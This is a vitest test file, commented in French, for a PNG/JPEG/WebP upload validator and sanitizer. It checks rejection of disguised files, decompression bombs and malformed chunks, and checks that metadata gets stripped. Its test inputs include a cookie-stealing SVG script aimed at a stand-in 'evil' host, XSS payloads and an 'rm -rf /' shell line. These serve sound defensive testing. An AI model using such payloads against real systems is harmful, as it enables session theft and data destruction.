// Cas d'ATTAQUE d'abord, cas nominal ensuite.
//
// Chaque protection annoncée dans `image-validation.ts` a ici sa démonstration :
// une charge qui l'exerce, et une assertion sur ce qui en sort. Une protection
// affirmée sans démonstration ne vaut rien.

import { describe, expect, it } from 'vitest';

import {
  MAX_IMAGE_BYTES,
  sniffImageType,
  validateAndSanitizeImage,
  type ImageValidation,
} from './image-validation.js';

// ─── Fabriques de charges ────────────────────────────────────────────────────

const PNG_MAGIC = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);

/** Un bloc PNG. Le CRC n'est pas calculé : l'analyseur recopie sans le vérifier. */
function chunk(type: string, data: Buffer): Buffer {
  const len = Buffer.alloc(4);
  len.writeUInt32BE(data.length);
  return Buffer.concat([len, Buffer.from(type, 'latin1'), data, Buffer.from([0, 0, 0, 0])]);
}

function ihdr(width: number, height: number): Buffer {
  const d = Buffer.alloc(13);
  d.writeUInt32BE(width, 0);
  d.writeUInt32BE(height, 4);
  d[8] = 8; // profondeur
  d[9] = 6; // RGBA
  return chunk('IHDR', d);
}

function png(width = 64, height = 64, extra: Buffer[] = []): Buffer {
  return Buffer.concat([
    PNG_MAGIC,
    ihdr(width, height),
    ...extra,
    chunk('IDAT', Buffer.from([0x78, 0x9c, 0x63, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01])),
    chunk('IEND', Buffer.alloc(0)),
  ]);
}

/**
 * JPEG structurellement valide : SOI, éventuels segments, SOF0 portant les
 * dimensions, SOS, données entropiques, EOI. Aucun décodage n'ayant lieu, des
 * données entropiques factices suffisent à exercer l'analyseur.
 */
function jpeg(width = 64, height = 64, segments: Buffer[] = []): Buffer {
  const sof = Buffer.alloc(19);
  sof.writeUInt16BE(0xffc0, 0);
  sof.writeUInt16BE(17, 2); // longueur
  sof[4] = 8; // précision
  sof.writeUInt16BE(height, 5);
  sof.writeUInt16BE(width, 7);
  sof[9] = 3; // composantes
  const sos = Buffer.from([0xff, 0xda, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3f, 0x00]);
  return Buffer.concat([
    Buffer.from([0xff, 0xd8]),
    ...segments,
    sof,
    sos,
    Buffer.from([0x12, 0x34, 0x56, 0x78]), // données entropiques factices
    Buffer.from([0xff, 0xd9]),
  ]);
}

function segmentJpeg(marqueur: number, charge: Buffer): Buffer {
  const len = Buffer.alloc(2);
  len.writeUInt16BE(charge.length + 2);
  return Buffer.concat([Buffer.from([0xff, marqueur]), len, charge]);
}

function blocRiff(fourcc: string, data: Buffer): Buffer {
  const h = Buffer.alloc(8);
  h.write(fourcc, 0, 'latin1');
  h.writeUInt32LE(data.length, 4);
  return Buffer.concat([h, data, ...(data.length % 2 ? [Buffer.from([0])] : [])]);
}

function vp8l(width = 64, height = 64): Buffer {
  const d = Buffer.alloc(5);
  d[0] = 0x2f;
  d.writeUInt32LE(((height - 1) << 14) | (width - 1), 1);
  return blocRiff('VP8L', d);
}

function webp(blocs: Buffer[]): Buffer {
  const corps = Buffer.concat(blocs);
  const h = Buffer.alloc(12);
  h.write('RIFF', 0, 'latin1');
  h.writeUInt32LE(corps.length + 4, 4);
  h.write('WEBP', 8, 'latin1');
  return Buffer.concat([h, corps]);
}

function accepte(r: ImageValidation): Extract<ImageValidation, { ok: true }> {
  if (!r.ok) throw new Error(`Attendu accepté, obtenu ${r.code} : ${r.message}`);
  return r;
}

// ─── Attaques ────────────────────────────────────────────────────────────────

describe('attaque — le fichier ment sur son type', () => {
  it('refuse un SVG, avec un motif nommant explicitement le SVG', () => {
    const svg = Buffer.from(
      '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("//evil/"+document.cookie)</script></svg>',
    );
    const r = validateAndSanitizeImage(svg);
    expect(r.ok).toBe(false);
    if (r.ok) return;
    expect(r.code).toBe('UNSUPPORTED_IMAGE_TYPE');
    expect(r.message).toContain('SVG');
  });

  it('refuse un SVG même précédé d’une déclaration XML ou d’un DOCTYPE', () => {
    for (const tete of [
      '<?xml version="1.0"?><svg onload="alert(1)"/>',
      '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"><svg/>',
      '   \n\t<svg/>',
    ]) {
      const r = validateAndSanitizeImage(Buffer.from(tete));
      expect(r.ok, tete).toBe(false);
    }
  });

  it('refuse un SVG QUEL QUE SOIT le nom ou le type annoncés — rien n’est lu du client', () => {
    // La fonction ne prend AUCUN nom de fichier et AUCUN Content-Type : il n'y a
    // pas de paramètre par lequel un mensonge du client pourrait entrer. C'est
    // la propriété que ce test constate au niveau du type.
    expect(validateAndSanitizeImage(Buffer.from('<svg/>')).ok).toBe(false);
    expect(sniffImageType(Buffer.from('<svg/>'))).toBeNull();
    // Constat de la propriété : la fonction est unaire. Il n'existe aucun
    // paramètre `filename` ni `declaredType` à faire mentir.
    expect(validateAndSanitizeImage).toHaveLength(1);
    expect(sniffImageType).toHaveLength(1);
  });

  it('refuse du HTML, un script et un exécutable déguisés en image', () => {
    for (const charge of [
      '<html><body><script>alert(1)</script></body></html>',
      '#!/bin/sh\nrm -rf /',
      'GIF89a', // format non pris en charge, donc refusé
    ]) {
      const r = validateAndSanitizeImage(Buffer.from(charge));
      expect(r.ok, charge).toBe(false);
      if (r.ok) continue;
      expect(r.code).toBe('UNSUPPORTED_IMAGE_TYPE');
    }
  });

  it('refuse un polyglotte : nombre magique PNG suivi de HTML', () => {
    // Le nombre magique passe le premier filtre — et c'est tout : l'analyse
    // structurelle ne trouve ni IHDR ni IDAT ni IEND.
    const r = validateAndSanitizeImage(
      Buffer.concat([PNG_MAGIC, Buffer.from('<script>alert(1)</script>')]),
    );
    expect(r.ok).toBe(false);
    if (r.ok) return;
    expect(r.code).toBe('MALFORMED_IMAGE');
  });

  it('refuse `FFD8` seul, qui n’est pas une signature JPEG suffisante', () => {
    expect(sniffImageType(Buffer.from([0xff, 0xd8, 0x00, 0x00]))).toBeNull();
    expect(sniffImageType(Buffer.from([0xff, 0xd8, 0xff, 0xe0]))).toBe('image/jpeg');
  });

  it('refuse un RIFF qui n’est pas un WebP', () => {
    const wav = Buffer.concat([Buffer.from('RIFF'), Buffer.alloc(4), Buffer.from('WAVE')]);
    expect(sniffImageType(wav)).toBeNull();
  });
});

describe('attaque — taille et dimensions', () => {
  it('refuse un fichier vide', () => {
    const r = validateAndSanitizeImage(Buffer.alloc(0));
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.code).toBe('EMPTY_FILE');
  });

  it('refuse un fichier au-delà de la borne, AVANT toute analyse', () => {
    const r = validateAndSanitizeImage(Buffer.alloc(MAX_IMAGE_BYTES + 1));
    expect(r.ok).toBe(false);
    // `FILE_TOO_LARGE` et non `UNSUPPORTED_IMAGE_TYPE` : la taille est jugée en
    // premier, donc aucun octet hostile n'est parcouru.
    if (!r.ok) expect(r.code).toBe('FILE_TOO_LARGE');
  });

  it('accepte exactement la borne', () => {
    const image = png(64, 64);
    const bourrage = Buffer.concat([image, Buffer.alloc(MAX_IMAGE_BYTES - image.length)]);
    expect(bourrage).toHaveLength(MAX_IMAGE_BYTES);
    // Le bourrage après IEND est abandonné — voir la section « assainissement ».
    expect(accepte(validateAndSanitizeImage(bourrage)).bytes.length).toBeLessThan(1000);
  });

  it('refuse une bombe de décompression sans allouer un seul pixel', () => {
    // 50 000 × 50 000 en RGBA = 10 Gio décodés. Le fichier fait ~100 octets.
    const bombe = png(50_000, 50_000);
    expect(bombe.length).toBeLessThan(200);

    const debut = process.hrtime.bigint();
    const r = validateAndSanitizeImage(bombe);
    const ms = Number(process.hrtime.bigint() - debut) / 1e6;

    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.code).toBe('IMAGE_DIMENSIONS_REJECTED');
    // Garde anti-vacuité : un refus obtenu APRÈS décodage serait aussi un refus.
    // Le budget de temps prouve que le refus a eu lieu sur les en-têtes.
    expect(ms).toBeLessThan(50);
  });

  it('refuse les dimensions démesurées dans les trois formats', () => {
    for (const charge of [png(9000, 9000), jpeg(9000, 9000), webp([vp8l(9000, 9000)])]) {
      const r = validateAndSanitizeImage(charge);
      expect(r.ok).toBe(false);
      if (!r.ok) expect(r.code).toBe('IMAGE_DIMENSIONS_REJECTED');
    }
  });

  it('refuse une image dérisoire (pixel-espion)', () => {
    const r = validateAndSanitizeImage(png(1, 1));
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.code).toBe('IMAGE_DIMENSIONS_REJECTED');
  });

  it('refuse une dimension nulle', () => {
    expect(validateAndSanitizeImage(png(0, 64)).ok).toBe(false);
    expect(validateAndSanitizeImage(jpeg(64, 0)).ok).toBe(false);
  });
});

describe('attaque — structure malformée', () => {
  it('refuse un PNG tronqué', () => {
    const r = validateAndSanitizeImage(png().subarray(0, 30));
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.code).toBe('MALFORMED_IMAGE');
  });

  it('refuse une longueur de bloc forgée pour lire au-delà du fichier', () => {
    const forge = Buffer.concat([PNG_MAGIC, ihdr(64, 64)]);
    forge.writeUInt32BE(0xfffffff0, 8); // IHDR annonce 4 Gio
    expect(validateAndSanitizeImage(forge).ok).toBe(false);
  });

  it('refuse un bloc CRITIQUE inconnu — on ne prétend pas comprendre un fichier à moitié', () => {
    const r = validateAndSanitizeImage(png(64, 64, [chunk('ZZZZ', Buffer.from('x'))]));
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.message).toContain('ZZZZ');
  });

  it('refuse un PNG sans IDAT ou sans IEND', () => {
    const sansIdat = Buffer.concat([PNG_MAGIC, ihdr(64, 64), chunk('IEND', Buffer.alloc(0))]);
    expect(validateAndSanitizeImage(sansIdat).ok).toBe(false);
  });

  it('refuse un JPEG sans balayage (SOS)', () => {
    const sansSos = Buffer.concat([Buffer.from([0xff, 0xd8]), segmentJpeg(0xe0, Buffer.alloc(10))]);
    expect(validateAndSanitizeImage(sansSos).ok).toBe(false);
  });

  it('refuse un WebP animé', () => {
    const r = validateAndSanitizeImage(webp([blocRiff('ANIM', Buffer.alloc(6)), vp8l()]));
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.message).toContain('animé');
  });

  it('refuse un WebP dont la taille RIFF déborde du fichier', () => {
    const w = webp([vp8l()]);
    w.writeUInt32LE(0xfffff0, 4);
    expect(validateAndSanitizeImage(w).ok).toBe(false);
  });
});

// ─── Assainissement : l'octet stocké n'est jamais l'octet reçu ───────────────

describe('assainissement', () => {
  it('abandonne un tEXt PNG porteur de HTML', () => {
    const charge = '<script>document.location="//evil"</script>';
    const r = accepte(validateAndSanitizeImage(png(64, 64, [chunk('tEXt', Buffer.from(charge))])));
    expect(r.bytes.toString('latin1')).not.toContain('script');
    expect(r.bytes.toString('latin1')).not.toContain('tEXt');
  });

  it('abandonne un eXIf PNG (géolocalisation)', () => {
    const gps = Buffer.from('GPSLatitude=-4.3276;GPSLongitude=15.3136');
    const r = accepte(validateAndSanitizeImage(png(64, 64, [chunk('eXIf', gps)])));
    expect(r.bytes.toString('latin1')).not.toContain('GPSLatitude');
  });

  it('abandonne ce qui suit IEND (polyglotte PNG + archive)', () => {
    const archive = Buffer.from('PKCHARGE-CACHEE');
    const r = accepte(validateAndSanitizeImage(Buffer.concat([png(), archive])));
    expect(r.bytes.toString('latin1')).not.toContain('CHARGE-CACHEE');
    expect(r.bytes.subarray(-4).toString('latin1')).not.toBe('PK');
  });

  it('abandonne APP1 (EXIF/GPS) et COM d’un JPEG', () => {
    const exif = Buffer.concat([Buffer.from('Exif\0\0'), Buffer.from('GPS:-4.3276,15.3136')]);
    const charge = jpeg(64, 64, [
      segmentJpeg(0xe0, Buffer.from('JFIF\0\0\0\0\0\0')),
      segmentJpeg(0xe1, exif),
      segmentJpeg(0xfe, Buffer.from('commentaire indiscret')),
    ]);
    const r = accepte(validateAndSanitizeImage(charge));
    expect(r.bytes.toString('latin1')).not.toContain('GPS:');
    expect(r.bytes.toString('latin1')).not.toContain('commentaire indiscret');
    // APP0 (JFIF) est conservé : c'est de l'apparence, pas de la métadonnée.
    expect(r.bytes.toString('latin1')).toContain('JFIF');
  });

  it('abandonne ce qui suit EOI dans un JPEG', () => {
    const r = accepte(
      validateAndSanitizeImage(Buffer.concat([jpeg(), Buffer.from('APPENDICE-HOSTILE')])),
    );
    expect(r.bytes.toString('latin1')).not.toContain('APPENDICE-HOSTILE');
  });

  it('abandonne EXIF/XMP d’un WebP ET éteint les drapeaux VP8X correspondants', () => {
    const vp8xData = Buffer.alloc(10);
    vp8xData[0] = 0b0000_1100; // drapeaux EXIF + XMP allumés
    vp8xData.writeUIntLE(63, 4, 3); // canevas 64
    vp8xData.writeUIntLE(63, 7, 3);
    const charge = webp([
      blocRiff('VP8X', vp8xData),
      vp8l(),
      blocRiff('EXIF', Buffer.from('GPS-SECRET')),
      blocRiff('XMP ', Buffer.from('<x:xmpmeta/>')),
    ]);

    const r = accepte(validateAndSanitizeImage(charge));
    expect(r.width).toBe(64);
    expect(r.bytes.toString('latin1')).not.toContain('GPS-SECRET');
    expect(r.bytes.toString('latin1')).not.toContain('xmpmeta');
    // Un drapeau menteur ferait chercher à un décodeur un bloc absent.
    const vp8xSortie = r.bytes.indexOf('VP8X', 0, 'latin1');
    expect(r.bytes[vp8xSortie + 8]! & 0b0000_1100).toBe(0);
  });

  it('recalcule la taille RIFF après retrait de blocs', () => {
    const r = accepte(
      validateAndSanitizeImage(webp([vp8l(), blocRiff('EXIF', Buffer.alloc(500))])),
    );
    expect(r.bytes.readUInt32LE(4)).toBe(r.bytes.length - 8);
  });

  it('produit une sortie qui se revalide à l’identique (idempotence)', () => {
    for (const charge of [
      png(64, 64, [chunk('tEXt', Buffer.from('x'))]),
      jpeg(64, 64, [segmentJpeg(0xe1, Buffer.from('Exif\0\0GPS'))]),
      webp([vp8l(), blocRiff('EXIF', Buffer.from('x'))]),
    ]) {
      const un = accepte(validateAndSanitizeImage(charge));
      const deux = accepte(validateAndSanitizeImage(un.bytes));
      expect(deux.bytes.equals(un.bytes)).toBe(true);
      expect(deux.contentType).toBe(un.contentType);
      expect([deux.width, deux.height]).toEqual([un.width, un.height]);
    }
  });
});

// ─── Cas nominal ─────────────────────────────────────────────────────────────

describe('cas nominal', () => {
  it('accepte PNG, JPEG et WebP et rend le type DÉDUIT DU CONTENU', () => {
    expect(accepte(validateAndSanitizeImage(png(200, 100))).contentType).toBe('image/png');
    expect(accepte(validateAndSanitizeImage(jpeg(200, 100))).contentType).toBe('image/jpeg');
    expect(accepte(validateAndSanitizeImage(webp([vp8l(200, 100)]))).contentType).toBe(
      'image/webp',
    );
  });

  it('rend les dimensions réelles, non carrées comprises', () => {
    expect(accepte(validateAndSanitizeImage(png(200, 100)))).toMatchObject({
      width: 200,
      height: 100,
    });
    expect(accepte(validateAndSanitizeImage(jpeg(200, 100)))).toMatchObject({
      width: 200,
      height: 100,
    });
    expect(accepte(validateAndSanitizeImage(webp([vp8l(200, 100)])))).toMatchObject({
      width: 200,
      height: 100,
    });
  });

  it('accepte les bornes exactes (32 et 4096)', () => {
    expect(validateAndSanitizeImage(png(32, 32)).ok).toBe(true);
    expect(validateAndSanitizeImage(png(4096, 4096)).ok).toBe(true);
    expect(validateAndSanitizeImage(png(31, 32)).ok).toBe(false);
    expect(validateAndSanitizeImage(png(4097, 32)).ok).toBe(false);
  });
});
